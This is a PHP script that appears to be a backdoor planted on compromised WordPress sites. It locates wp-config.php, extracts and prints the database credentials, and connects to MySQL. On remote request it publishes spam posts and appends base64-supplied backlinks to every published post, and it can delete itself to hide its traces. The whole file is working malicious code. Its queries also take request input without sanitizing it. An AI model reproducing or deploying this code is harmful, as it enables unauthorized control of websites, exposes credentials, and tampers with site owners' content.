<?php error_reporting(E_ERROR|E_WARNING|E_PARSE|E_COMPILE_ERROR);ini_set('display_errors','on');set_time_limit(0);check_commands();echo "<br>tt"."main"."tt<br>";if(array_key_exists('article',$_REQUEST)){$d0=get_load_path();$z1=include_once($d0);if($z1&&function_exists('wp_insert_post')&&function_exists('get_permalink')){print"#loaded wp-load#\n";wp_load_insert_post();}else{print"#Failed to load wp-load, trying to parse config directly#\n";list($x2,$b3,$v4,$g5)=get_mysql_mysqli_handlers();$s6=get_conf_path();$g7='wp_';$t8=connect_using_parse_config($s6);if($t8){print"#success connection using parse#\n";}else{print"#failed to connect using parse#\n";die;}config_parse_insert_post();}}else{list($x2,$b3,$v4,$g5)=get_mysql_mysqli_handlers();$s6=get_conf_path();$g7='wp_';$t8=etablish_db_connection($s6);dispatch_exec_commands_for_conf();}function config_parse_insert_post(){list($d9,$x10)=get_article();$h11=sql_wp_insert_post(array('post_title' =>$x10,'post_content' =>$d9,'post_status' =>'publish','post_date' =>date('Y-m-d H:i:s'),'post_author' =>'1','post_type' =>'post','post_category' =>array(0)));if($h11){$j12=sql_get_permalink($h11);print"#Created post_id: !$h11!$j12!#\n";}else{print"#Unable to create new post#\n";}}function sql_wp_insert_post($r13){$g14=array('post_title' =>$r13['post_title'],'post_content' =>$r13['post_content'],'post_status' =>$r13['post_status'],'post_date' =>$r13['post_date'],'post_date_gmt' =>$r13['post_date'],'post_author' =>$r13['post_author'],'post_type' =>$r13['post_type'],'post_modified' =>$r13['post_date'],'post_modified_gmt' =>$r13['post_date'],'post_content_filtered' =>'','post_excerpt' =>'','to_ping' =>'','pinged' =>'',);global $g7;global $t8;$t15=execute_query("INSERT INTO ".$g7."posts (`post_title`, `post_content`, `post_status`, `post_date`, `post_date_gmt`, `post_author`, `post_type`, `post_modified`, `post_modified_gmt`, `post_excerpt`, `to_ping`, `pinged`, `post_content_filtered`) VALUES ('".$g14['post_title']."','".$g14['post_content']."','".$g14['post_status']."','".$g14['post_date']."','".$g14['post_date']."','".$g14['post_author']."','".$g14['post_type']."','".$g14['post_modified']."','".$g14['post_modified_gmt']."','".$g14['post_excerpt']."','".$g14['to_ping']."','".$g14['pinged']."','".$g14['post_content_filtered']."')");return $t8->$t16;}function sql_get_permalink($h11){$s6=get_conf_path();$c17=substr_count($s6,'../');$j12="$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";$j12=strtok($j12,'?');$j18=explode('/',$j12);array_pop($j18);array_splice($j18,0,-$c17);$r19="http://".join('/',$j18)."/";return $r19."?p=$h11";}function wp_load_insert_post(){list($d9,$x10)=get_article();$h11=wp_insert_post(array('post_title' =>$x10,'post_content' =>$d9,'post_status' =>'publish','post_date' =>date('Y-m-d H:i:s'),'post_author' =>get_admin_id(),'post_type' =>'post','post_category' =>array(0)));if($h11){$j12=get_permalink($h11);print"#Created post_id: !$h11!$j12!#\n";}else{print"#Unable to create new post#\n";}}function get_mysql_mysqli_handlers(){if(function_exists('mysqli_connect')){return array('mysqli_connect','mysqli_query','mysqli_error','mysqli_real_escape_string');}if(function_exists('mysql_connect')){return array('mysql_connect','mysql_query','mysql_error','mysql_real_escape_string');}echo "Unable to get dbh\n";die;}function dispatch_exec_commands_for_conf(){if(array_key_exists('first',$_REQUEST)){get_posts_count();$k20=get_first_post_id();if($k20){print"#First id: $k20#\n";}else{print"#No matching posts were found#\n";die;}fetch_next_post($k20);}if(array_key_exists('post_id',$_REQUEST)){$h21=$_REQUEST['post_id'];$d22=get_backlink();add_backlink_to_post($d22,$h21);fetch_next_post($h21);}}function fetch_next_post($h21){$r23=get_next_post_id($h21);if($r23){print"#Next id: $r23#\n";}else{print"#No next id#\n";}}function check_commands(){if(array_key_exists('delete',$_REQUEST)){unlink(__FILE__);}}function get_admin_id(){$p24=get_super_admins();$j25=get_user_by('login',$p24[array_rand($p24)]);return $j25->$a26;}function get_conf_path(){return get_file_path('wp-config.php');}function get_load_path(){return get_file_path('wp-load.php');}function get_file_path($u27){$t28=$u27;for($l29=0;$l29<10;$l29++){$u30=$l29==0?'./':str_repeat('../',$l29);$u27=$u30.$u27;if(is_readable($u27)){echo"config path: $u27\n";return $u27;}$u27=$t28;}echo "Unable to find ".$u27;die;}function get_backlink(){if(array_key_exists('link',$_REQUEST)){return base64_decode(urldecode($_REQUEST['link']));}echo "No links where specified.";die;}function get_article(){if(array_key_exists('article',$_REQUEST)&&array_key_exists('title',$_REQUEST)){$d9=base64_decode(urldecode($_REQUEST['article']));$x10=base64_decode(urldecode($_REQUEST['title']));return array($d9,$x10);}echo "No articles where specified.";die;}function etablish_db_connection($j31){$g32=connect_using_parse_config($j31);if($g32){return $g32;}$g32=connect_using_require($j31);if($g32){return $g32;}echo "Failed to connect to MySQL\n";die;}function connect_using_require($j31){global $g7;echo "Trying to connect using require\n";require_once($j31);echo "Got table prefix using require\n";$g7=$g33;$t8=db_connect(DB_HOST,DB_USER,DB_PASSWORD,DB_NAME,'require');return $t8;}function db_connect($v34,$y35,$j36,$g37,$w38){global $x2;global $v4;echo"#db_connect host: $v34 user: $y35 password: $j36 name: $g37 method_name: $w38#\n";if(is_mysqli()){$b39=null;$s40=null;$s41=strstr($v34,':');if(!empty($s41)){$v34=substr($v34,0,strpos($v34,':'));$s41=substr($s41,1);if(strpos($s41,'/')!==0){$b39=intval($s41);$x42=strstr($s41,':');if(!empty($x42)){$s40=substr($x42,1);}}else{$s40=$s41;}}$t8=call_user_func($x2,$v34,$y35,$j36,$g37,$b39,$s40);}else{$t8=call_user_func($x2,$v34,$y35,$j36,$g37);mysql_select_db($g37);}if(!$t8){echo"Failed to connect to MySQL using $w38: ".call_user_func($v4)."\n";return 0;}echo"Success connection using $w38\n";return $t8;}function connect_using_parse_config($j31){global $g7;$s43=file_get_contents($j31);if(preg_match("/define\('DB_HOST',\s*'(.*?)'\);/",$s43,$d44)){$v34=$d44[1];}if(preg_match("/define\('DB_USER',\s*'(.*?)'\);/",$s43,$d44)){$y35=$d44[1];}if(preg_match("/define\('DB_PASSWORD',\s*'(.*?)'\);/",$s43,$d44)){$y45=$d44[1];}if(preg_match("/define\('DB_NAME',\s*'(.*?)'\);/",$s43,$d44)){$g37=$d44[1];}if(preg_match("/\\\$table_prefix\s*=\s*'(.*?)';/",$s43,$d44)){echo "Got table prefix using parse\n";$g7=$d44[1];}else{echo "Wasn't able to get table prefix using parse\n";}if(!isset($v34)||!isset($y35)||!isset($y45)||!isset($g37)){echo "Failed to connect to MySQL using parse: failed to extract data\n";return 0;}$t8=db_connect($v34,$y35,$y45,$g37,'parse');return $t8;}function get_first_post_id(){global $g7;$t15=execute_query("SELECT id FROM ".$g7."posts WHERE post_status = 'publish' AND post_type IN ('post', 'page') ORDER BY id ASC LIMIT 1");$t15=fetch_assoc($t15);if(count($t15)==0){return false;}return $t15[0]['id'];}function fetch_assoc($t15){$r46=array();if(is_mysqli()){while($f47=$t15->fetch_assoc()){$r46[]=$f47;}}else{while($f47=mysql_fetch_assoc($t15)){$r46[]=$f47;}}return $r46;}function is_mysqli(){global $x2;return $x2==='mysqli_connect';}function get_next_post_id($f48){global $t8;global $g7;$t15=execute_query("SELECT id FROM ".$g7."posts WHERE post_status = 'publish' AND post_type IN ('post', 'page') AND ID > $f48 ORDER BY id ASC LIMIT 1");$t15=fetch_assoc($t15);if(count($t15)==0){return false;}return $t15[0]['id'];}function execute_query($q49){global $t8;global $b3;global $v4;if(is_mysqli()){echo"query: $q49#";$t15=call_user_func($b3,$t8,$q49);}else{$t15=call_user_func($b3,$q49);}if(!$t15){echo"Failed to execute query ($a50): ".get_error();die;}return $t15;}function get_error(){global $t8;if(is_mysqli()){return mysqli_error($t8);}else{return mysql_error();}}function get_posts_count(){global $g7;echo"#wp_prefix: $g7#\n";$t15=execute_query("SELECT COUNT(*) FROM ".$g7."posts WHERE post_status = 'publish' AND post_type IN ('post', 'page')");$t15=fetch_assoc($t15);$h51=$t15[0]['COUNT(*)'];echo"#Posts count: $h51#\n";return $h51;}function get_post_data($h21){global $g7;$t15=execute_query("SELECT id,guid,post_content FROM ".$g7."posts WHERE id = $h21");$t15=fetch_assoc($t15);if(count($t15)==0){print"#No post available with id: $h21#\n";die;}return $t15[0];}function add_backlink_to_post($j12,$h21){global $t8;global $g7;global $g5;global $v4;$n52=get_post_data($h21);$h11=$n52['id'];$s53=$n52['guid'];$x54=call_user_func($g5,$t8,$n52['post_content'].$j12);$g32=execute_query("UPDATE ".$g7."posts SET post_content = '$x54' WHERE id = $h11");if($g32){echo"#Success: $s53#\n";}else{echo call_user_func($v4);echo"#Failed: $s53#\n";}}?>